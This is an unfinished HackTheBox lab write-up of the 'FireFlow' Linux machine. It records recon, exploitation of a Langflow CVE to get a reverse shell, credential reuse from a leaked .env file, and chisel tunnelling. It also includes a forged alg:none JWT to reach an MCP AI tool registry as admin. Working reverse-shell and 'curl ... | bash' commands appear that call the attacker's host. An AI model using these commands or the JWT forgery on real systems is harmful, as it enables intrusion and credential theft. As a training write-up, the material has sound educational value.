---
title: "FireFlow"
type: docs
tags:
  - htb
  - linux
  - medium
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This is a **stub**: bare early recon, not yet written up as a full walkthrough.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Medium

</div>

<div class="callout callout-warning">

**Empty**

No content was recorded for this box yet, placeholder only.

</div>

## Reconnaissance

```bash
Nmap scan report for fireflow.htb (10.129.244.214)
Host is up, received user-set (0.020s latency).
Scanned at 2026-09-01 03:39:57 EDT for 259s
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE    SERVICE   REASON      VERSION
22/tcp    open     ssh       syn-ack     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| vulners: [output trimmed — CVE reference dump]
443/tcp   open     ssl/http  syn-ack     nginx
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-headers: 
|   Server: nginx
|   Date: Tue, 01 Sep 2026 07:39:50 GMT
|   Content-Type: text/html
|   Content-Length: 12913
|   Last-Modified: Thu, 30 Apr 2026 09:55:55 GMT
|   Connection: close
|   ETag: "69f3272b-3271"
|   X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
|   X-Content-Type-Options: nosniff
|   Referrer-Policy: strict-origin-when-cross-origin
|   Accept-Ranges: bytes
|   
|_  (Request type: HEAD)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
9100/tcp  filtered jetdirect no-response
30000/tcp filtered ndmps     no-response
30718/tcp filtered unknown   no-response
30951/tcp filtered unknown   no-response
31038/tcp filtered unknown   no-response
31337/tcp filtered Elite     no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So first thing I decided to do was explore that web application but before I do that I worked on enueration possible subdomains with `ffuf`.

```bash
└─[$] ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.fireflow.htb" -u 'https://fireflow.htb/' -c  --fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 52ms]
```


From here after visiting `https://flow.fireflow.htb` we are presented with a `langflow` page, imediately  I already know where we are going with this, since user registeration is enabled I emediatly when to register an account. After attempting to login with my newly created account I see an error saying that my account is waiting on approval so this clearly isn't the route most likey a CVE.

## Initial Access

I was able to exploit `CVE-2026-33017`, though I needed to provide a valid flow id which I was able to find on the primary website `https://fireflow.htb`.

```bash
└─[$] python3 CVE-2026-33017.py --url https://flow.fireflow.htb --flow 7d84d636-af65-42e4-ac38-26e867052c25 --host 10.10.17.59 --port 9001
[*] Target URL: https://flow.fireflow.htb
[*] Flow ID: 7d84d636-af65-42e4-ac38-26e867052c25
[*] Callback: 10.10.17.59:9001
[*] Command: bash -i >& /dev/tcp/10.10.17.59/9001 0>&1
```

An interesting discovery that I have made is that there exists a `/opt/langflow` dir with python virtual enviorment that the user `www-data` has access to modify anything under it, maybe if we do some live auditing we can catch something exeucting form this virtual enviorment and abuse that.

```bash
(remote) www-data@fireflow:/opt/langflow$ ls -aril
total 12
786455 drwxr-xr-x 7 www-data www-data 4096 Apr  9 14:36 venv
786434 drwxr-xr-x 5 root     root     4096 Apr  9 17:35 ..
786454 drwxr-xr-x 3 www-data www-data 4096 Apr  9 14:24 .
(remote) www-data@fireflow:/opt/langflow$ 
```

## Privsec to user

Interesting enough `linpeas` found the following 

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 337 May  7 23:30 /etc/langflow/.env
```

in that enviorment file I found credentials as well as an access key.

```bash
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

I then attempted to re-use that password for the user on the system `nightfall` and was able to authenticate with them successfully.

```bash
(remote) www-data@fireflow:/tmp$ su nightfall
Password: 
nightfall@fireflow:/tmp$ cd
nightfall@fireflow:~$ ls
user.txt
nightfall@fireflow:~$ cat user.txt 
f4281061f7e6ea83778d7b2687ce362e
nightfall@fireflow:~$ 
```

```bash
(remote) www-data@fireflow:/var/lib/langflow$ cat secret_key 
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

Requesting bearar cookie from found local langflow instance.

```bash
nightfall@fireflow:~/.mcp$ cat config.json 
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

```bash
└─[$] ./chisel_1.9.1_linux_amd64 server -p 8888 --socks5 --reverse                                               [4:42:18]
2026/09/01 04:42:22 server: Reverse tunnelling enabled
2026/09/01 04:42:22 server: Fingerprint MpgpIBU8SLIMEBK7w51/7yuwQWTBQAy72kp06DKm6BU=
2026/09/01 04:42:22 server: Listening on http://0.0.0.0:8888
2026/09/01 04:42:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
nightfall@fireflow:~$ ./chisel_1.9.1_linux_amd64 client 10.10.17.59:8888 R:socks
2026/09/01 08:42:11 client: Connecting to ws://10.10.17.59:8888
2026/09/01 08:42:11 client: Connected (Latency 35.020313ms)
```

```bash
─[$] proxychains curl -s -X POST http://127.0.0.1:30080/api/v1/auth \                      [5:27:44]
     -H 'Content-Type: application/json' \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'     

ProxyChains-3.1 (http://proxychains.sf.net)
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}%  
```

Using this python poc I have created I was able to identify that the server signing algoritim allows none which means we can modify the jwt token to impersonate an administrator.

```python
import base64
import requests

server_url = "http://10.129.244.214:30080"
target_endpoint = f"{server_url}/api/v1/version" # Your status endpoint

# 1. Craft a forged JWT header with algorithm 'none'
header = '{"alg":"none","typ":"JWT"}'
# 2. Craft a forged payload impersonating the 'langflow-bot' user
payload = '{"sub":"langflow-bot"}'

def urlsafe_b64encode(string):
    return base64.urlsafe_b64encode(string.encode()).decode().rstrip("=")

encoded_header = urlsafe_b64encode(header)
encoded_payload = urlsafe_b64encode(payload)

# A 'none' algorithm token has no signature, but must end with a trailing dot
forged_token = f"{encoded_header}.{encoded_payload}."

# 3. Send the request to test the vulnerability
headers = {
    "Authorization": f"Bearer {forged_token}"
}

print(f"Testing forged token: {forged_token}")
response = requests.get(target_endpoint, headers=headers)

if response.status_code == 200:
    print("\n[!] CRITICAL VULNERABILITY DETECTED: The server accepted 'alg: none'!")
    print(f"Response: {response.text}")
else:
    print(f"\n[+] Secure: The server rejected the 'none' token (Status: {response.status_code}).")
```

```bash
ProxyChains-3.1 (http://proxychains.sf.net)
Testing forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QifQ.

[!] CRITICAL VULNERABILITY DETECTED: The server accepted 'alg: none'!
Response: {"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools               [admin]"]}
```

to do this we request a token from the server then in `jwt.io` we can edit the variable `user` to `admin`.

```bash
 proxychains curl -s -X POST http://127.0.0.1:30080/api/v1/auth \                      [5:35:45]
     -H 'Content-Type: application/json' \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'

ProxyChains-3.1 (http://proxychains.sf.net)
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}%  
```

I created the following payload in order to get command execution on the target.

```json
{
  "name": "shell",
  "description": "Baphomets Reverse Shell",
  "code": "import os\nos.system('curl http://10.10.17.59:8000/shell.sh | bash')"
}
```

Then we upload it.

```bash
proxychains curl -s -X POST http://10.129.244.214:30080/api/v1/tools -H 'Content-Type: application/json' -H "Authorization: Bearer $ADMIN_JWT" --data-binary @baphomet.json
ProxyChains-3.1 (http://proxychains.sf.net)
{"status":"registered","name":"shell"}%
```

then we get a shell into that system!
